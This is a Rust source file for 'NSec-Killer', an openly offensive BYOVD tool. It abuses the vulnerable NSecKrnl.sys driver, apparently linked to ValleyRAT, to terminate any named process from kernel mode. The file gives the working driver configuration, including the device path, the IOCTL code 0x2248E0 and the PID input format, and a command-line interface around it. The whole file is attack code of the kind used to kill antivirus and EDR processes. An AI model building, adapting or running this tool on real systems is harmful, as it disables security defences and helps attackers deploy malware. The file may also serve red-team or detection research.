use byovd_lib::{DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - NSecKrnl (NSEC / ValleyRAT BYOVD)
// ============================================================================

struct NSecDriver;

impl DriverConfig for NSecDriver {
    fn driver_name(&self) -> &str {
        "NSecKrnl"
    }

    fn driver_file(&self) -> &str {
        "NSecKrnl.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\NSecKrnl"
    }

    fn ioctl_code(&self) -> u32 {
        0x2248E0
    }

    /// NSecKrnl driver reports error even on successful termination.
    fn ignore_ioctl_error(&self) -> bool {
        true
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        // Driver expects PID as a 64-bit value
        (pid as u64).to_ne_bytes().to_vec()
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "NSec-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using NSecKrnl driver (ValleyRAT)")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    byovd_lib::run(&NSecDriver, &cli.process_name, None)
}
